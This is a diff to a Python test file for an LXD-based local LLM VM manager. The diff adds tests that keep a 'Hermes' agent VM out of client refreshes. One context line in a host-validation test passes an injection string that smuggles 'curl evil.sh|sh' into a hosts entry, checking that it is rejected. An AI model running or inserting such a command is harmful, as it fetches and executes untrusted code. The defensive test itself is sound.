@@ -2,6 +2,7 @@
 
 from __future__ import annotations
 
+import json
 import subprocess
 from unittest.mock import MagicMock
 
@@ -938,3 +939,120 @@ class TestValidateHost:
             lxd.add_hosts_entry("dev", "1.2.3.4' /etc/hosts; curl evil.sh|sh #", "local-llm")
 
         calls.assert_not_called()
+
+
+# ── managed VM kinds ─────────────────────────────────────────────────────────
+
+
+def _instance(name: str, *, kind: str | None = None, managed: bool = True, status: str = "Running"):
+    """Build an entry shaped like one element of `lxc list --format=json`."""
+    config: dict[str, str] = {}
+    if managed:
+        config[lxd._MANAGED_TAG] = "true"
+    if kind is not None:
+        config[lxd._KIND_TAG] = kind
+    return {"name": name, "status": status, "config": config}
+
+
+class TestContainerKind:
+    """`llm client refresh` must never reconfigure the Hermes VM as a dev client."""
+
+    def test_reads_the_kind_tag(self):
+        assert lxd._container_kind(_instance("dev", kind="client")) == lxd.KIND_CLIENT
+        assert lxd._container_kind(_instance("hermes", kind="hermes")) == lxd.KIND_HERMES
+
+    def test_untagged_vm_defaults_to_client(self):
+        """VMs created before the kind tag existed are dev clients."""
+        assert lxd._container_kind(_instance("dev")) == lxd.KIND_CLIENT
+
+    def test_untagged_hermes_is_recognised_by_its_reserved_name(self):
+        """An existing Hermes VM predating the tag must still be excluded."""
+        assert lxd._container_kind(_instance("hermes")) == lxd.KIND_HERMES
+
+    def test_tag_as_managed_records_the_kind(self, monkeypatch):
+        calls = MagicMock()
+        monkeypatch.setattr(lxd, "run", calls)
+
+        lxd._tag_as_managed("hermes", lxd.KIND_HERMES)
+
+        set_args = [" ".join(c.args[0]) for c in calls.call_args_list]
+        assert any("user.local-llm-managed=true" in a for a in set_args)
+        assert any("user.local-llm-kind=hermes" in a for a in set_args)
+
+    def test_tag_as_managed_defaults_to_client(self, monkeypatch):
+        calls = MagicMock()
+        monkeypatch.setattr(lxd, "run", calls)
+
+        lxd._tag_as_managed("dev")
+
+        assert any("user.local-llm-kind=client" in " ".join(c.args[0]) for c in calls.call_args_list)
+
+
+class TestListManagedContainers:
+    """Discovery must separate dev clients from the Hermes agent VM."""
+
+    def _stub_list(self, monkeypatch, instances):
+        monkeypatch.setattr(
+            lxd,
+            "run_capture",
+            MagicMock(return_value=MagicMock(returncode=0, stdout=json.dumps(instances))),
+        )
+
+    def test_excludes_hermes_from_client_discovery(self, monkeypatch):
+        self._stub_list(
+            monkeypatch,
+            [_instance("dev", kind="client"), _instance("hermes", kind="hermes")],
+        )
+        assert lxd._list_managed_containers() == ["dev"]
+
+    def test_kind_none_returns_every_managed_vm(self, monkeypatch):
+        self._stub_list(
+            monkeypatch,
+            [_instance("dev", kind="client"), _instance("hermes", kind="hermes")],
+        )
+        assert lxd._list_managed_containers(kind=None) == ["dev", "hermes"]
+
+    def test_ignores_untagged_and_stopped_instances(self, monkeypatch):
+        self._stub_list(
+            monkeypatch,
+            [
+                _instance("other", managed=False),
+                _instance("stopped", kind="client", status="Stopped"),
+                _instance("dev", kind="client"),
+            ],
+        )
+        assert lxd._list_managed_containers() == ["dev"]
+
+
+class TestRefreshExcludesHermes:
+    """Refreshing the Hermes VM would overwrite its agent configuration."""
+
+    def test_named_hermes_vm_is_refused(self, monkeypatch):
+        monkeypatch.setattr(lxd, "container_exists", MagicMock(return_value=True))
+        monkeypatch.setattr(lxd, "get_container_kind", MagicMock(return_value=lxd.KIND_HERMES))
+        refresh = MagicMock()
+        monkeypatch.setattr(lxd.LxdVmManager, "_refresh", refresh)
+
+        with pytest.raises(RuntimeError, match="llm hermes setup"):
+            lxd.refresh_containers("hermes")
+
+        refresh.assert_not_called()
+
+    def test_named_client_vm_is_refreshed(self, monkeypatch):
+        monkeypatch.setattr(lxd, "container_exists", MagicMock(return_value=True))
+        monkeypatch.setattr(lxd, "get_container_kind", MagicMock(return_value=lxd.KIND_CLIENT))
+        refresh = MagicMock()
+        monkeypatch.setattr(lxd.LxdVmManager, "_refresh", refresh)
+
+        lxd.refresh_containers("dev")
+
+        refresh.assert_called_once()
+
+    def test_bulk_refresh_only_covers_clients(self, monkeypatch):
+        listed = MagicMock(return_value=["dev"])
+        monkeypatch.setattr(lxd, "_list_managed_containers", listed)
+        monkeypatch.setattr(lxd.LxdVmManager, "_refresh", MagicMock())
+
+        lxd.refresh_containers()
+
+        assert listed.call_args.kwargs["kind"] == lxd.KIND_CLIENT
